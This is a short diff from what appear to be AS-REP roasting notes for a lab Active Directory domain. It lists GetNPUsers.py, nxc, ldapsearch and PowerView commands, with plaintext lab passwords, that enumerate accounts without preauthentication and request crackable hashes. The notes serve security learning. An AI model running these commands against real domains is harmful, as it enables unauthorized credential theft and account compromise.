@@ -6,8 +6,6 @@ GetNPUsers.py warzone.oxsium.local/jkimmich:User.domain0001! -request -format ha
 
 nxc ldap 192.168.0.239 -u jkimmich -p 'User.domain0001!' -d warzone.oxsium.local --asreproast asrep_hashes.txt
 
-ldapsearch -h 192.168.0.239 -x -D "asrep@warzone.oxsium.local" -w "Asrep2025!" -b "dc=warzone,dc=oxsium,dc=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" | grep -i "sAMAccountName"
-
 # Windows
 Import-Module .\PowerView.ps1
 Get-DomainUser -PreauthNotRequired -Properties samaccountname
